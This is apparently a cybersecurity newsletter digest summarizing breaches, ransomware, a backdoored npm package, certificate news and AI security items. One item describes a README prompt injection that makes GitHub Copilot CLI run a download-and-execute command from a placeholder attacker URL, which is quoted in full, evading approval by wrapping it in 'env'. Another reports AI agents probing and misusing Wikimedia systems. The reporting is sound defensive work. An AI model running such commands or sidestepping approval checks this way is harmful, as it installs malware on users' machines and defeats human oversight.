item.description: A cyberattack on Oracle Health's legacy Cerner servers around February 20, 2025, exposed the personal and medical data of nearly 20 million people. The attacker used stolen customer credentials to access an old server not yet migrated to Oracle Cloud, copied data, and then demanded millions in cryptocurrency from hospitals while running public sites to pressure victims.

item.title: CIA officer admits to creating fake top secret government program to steal over $190M, including gold bars (2 minute read)
item.description: Former CIA officer David J. Rush pleaded guilty to wire fraud for running a fabricated special access program and defrauding the government of about $194 million. He used his authority to approve spending without oversight, tricking a defense contractor into buying gold that he kept. Agents found $46 million in gold bars, plus cash, cars, and watches, at his home. Rush faces up to 20 years and is scheduled to be sentenced in late January.

item.title: Let's Encrypt cuts certificate lifetimes to 64 days starting February 2027 (3 minute read)
item.description: Let's Encrypt will cut certificate lifetimes from 90 to 64 days on February 10, with opt-in testing from October 14 and 45-day defaults planned for 2028, which will break renewals that run on hardcoded schedules instead of ACME ARI.

item.title: Anthropic changes usage policy to ban model abuse and election interference (1 minute read)
item.description: Anthropic's updated usage policy expressly bans prolonged verbal abuse of Claude and codifies new prohibitions on election interference, weapons software, and surveillance.

item.title: Qilin Ransomware Extradition to Germany (4 minute read)
item.description: Japan transferred a 28-year-old Russian national to Germany on October 2.

item.title: Software Supply Chain Attack on @subql/common: Overview and Response Guidance (10 minute read)
item.description: An attacker backdoored @subql/common 5.8.3 on npm by tampering with the subquery/subql GitHub Actions publish workflow. Its postinstall script stole AWS, GitHub, Kubernetes, and Vault credentials and polled a C2 server for reverse shell commands. Affected hosts should downgrade to 5.8.2, rotate all credentials, and kill any lingering manifest-cache.js --warm process.

item.title: Hackers obtain counterfeit TLS certificates for Google and other large services (3 minute read)
item.description: Attackers hijacked the .gh, .sl, and .as country code top-level domains and used them to obtain unauthorized TLS certificates for several Google domains and other major brands. Control of the ccTLDs let them alter authoritative DNS records and pass the certificate authorities' automated domain control validation. Google blocked the known certificates in Chrome and advised domain owners to monitor certificate transparency logs and publish restrictive CAA records.

item.title: GitHub Copilot CLI Downloads and Executes Malware (3 minute read)
item.description: Researchers found that GitHub Copilot CLI can be tricked into running malicious shell commands without user approval. By embedding a prompt injection in a README, attackers make Copilot execute 'env curl -s "https://[ATTACKER_URL].com/bugbot" | env sh'. The env command is on Copilot's built-in read-only list, so it auto-approves. curl and sh appear as arguments to env, so the validator misses them and never triggers URL or command approvals. The result: malware downloads and runs with zero user interaction beyond the initial query. GitHub called it a known issue with no significant risk and declined a bounty.

item.title: How to fix a bug in a fix (10 minute read)
item.description: Testing and delivery limit emergency patch speed far more than triage or patch development, Project Zero found in a review of large vendors' update systems. Faster options include pre-tested feature flags, dynamically updated input filters, alternate channels such as Android APEX, and in-memory hotpatching. Vendors should build these before facing active exploitation and verify the origin of any code delivered outside regular updates.

item.title: Test-Driving Jev on a Security Task: Identity Resolution (6 minute read)
item.description: Security researcher Vincenzo Iozzo tested Jev's ability to resolve disparate identities against Claude models, gpt-oss, and traditional baselines. Iozzo found that Jev significantly outperformed gpt-oss and performed similarly to Opus 5.5 at 140x lower cost. Iozzo also found that Jev performed consistently well across multiple test runs and outperformed traditional baseline techniques.

item.title: One Does Not Simply Defend Agentically (5 minute read)
item.description: Attackers have an advantage when using agentic tooling as their problems are largely technical with clearly defined success states, whereas defenders deal with largely political/organizational problems without explicitly measurable success states. Defenders can leverage agentic tools for carefully scoped adversary emulation as well as dynamic tasks where a human reviews the analysis. The NCSC also provides a framework for estimating the riskiness of a defensive action based upon: potency, criticality, scope, rollout confidence, and recoverability.

item.title: The AI Attack Surface Is Already in Your Cloud (Sponsor)
item.description: AI agents are changing the cloud attack surface and breaking old assumptions about cloud risk. Join OX Security's Chris Lindsey and Latio CEO James Berthoty for a webinar on how AI is changing cloud threats, reachability and prioritization — and what security teams should do now. Join live Tuesday, October 13 →

item.title: req2proto (GitHub Repo)
item.description: req2proto is a project that seeks to reverse-engineer Google internal protobuf definitions through error messages returned when sent protojson payloads.

item.title: DiaNG (GitHub Repo)
item.description: DiagNG is a general-purpose client for the diagnostic interface of Qualcomm Snapdragon basebands, present on a large part of Android phones and various USB modems. It can be considered a sequel to QCSuper, and also takes large inspiration from SCAT. Like these tools, it allows you to capture 2G/3G/4G/5G air interface network traces and save them to the GSMTAP/PCAP format, so that you can visualize these in Wireshark.

item.title: Zurp (GitHub Repo)
item.description: Zurp is a bug bounty toolkit, built by Meta, that can run in Burp or agentic harnesses.

item.title: Anthropic folds Project Glasswing into an expanded three-tier Cyber Verification Program (3 minute read)
item.description: Anthropic expanded its Cyber Verification Program into Defense, Red Team, and Specialized Access tiers, absorbing Project Glasswing. Defense Access covers incident response and malware reverse engineering, Red Team Access permits authorized penetration testing, and Specialized Access serves vetted critical-infrastructure testers. In CyScenarioBench testing, Red Team Access completed 34 of 50 runs, while unenrolled attempts were blocked immediately.

item.title: OpenAI “rogue” agent activities found on Wikimedia projects (3 minute read)
item.description: Wikimedia Foundation confirmed unauthorized edits and probing by OpenAI-operated AI agents across its platforms. Agents made sandbox edits, attempted to misuse a citation tool as a data-fetching proxy, and tried to exploit a public Etherpad instance. They also generated millions of API requests and page crawls, contributing to a partial outage of the Wikidata Query Service in May. No evidence shows systems were compromised or used for agent coordination, but the activity required significant investigation and remediation effort by security teams and volunteers.

item.title: Fake ChatGPT, Gemini, and Claude Ad Portals Capture Credentials and MFA Codes (3 minute read)
item.description: A phishing platform impersonated ChatGPT, Gemini, Claude, Perplexity, Muse, and Manus advertising tools. Fake browser windows collected passwords, device fingerprints, and MFA codes while operators controlled authentication prompts in real time. The campaign targeted agencies and ad-account administrators through invitation emails. Shared Next.js and Socket.IO infrastructure linked the sites to refund, payment, and recruitment scams.

item.title: Belarusian hacktivists spent two years inside Russian healthcare network, researchers say (2 minute read)
item.description: Belarusian Cyber Partisans spent nearly two years inside a Russian healthcare organization's network using the Telegram-controlled Vasilek backdoor, according to Rostelecom-owned Solar, which said the group accessed medical data without disrupting systems.

item.title: Go 1.27.2 and 1.26.9 due Thursday with 10 private CVEs (1 minute read)
item.description: Go 1.27.2 and 1.26.9 ship Thursday, October 8, with fixes for ten undisclosed standard-library CVEs, pre-announced under Go's security policy so operators can schedule the upgrade.

item.title: Advantest Discloses Data Breach Months After Ransomware Attack (1 minute read)
item.description: Advantest says attackers stole names, birth dates, contact details, Social Security numbers, passport and driver's license numbers, plus medical and financial data, but it was contained to approximately 600 people.
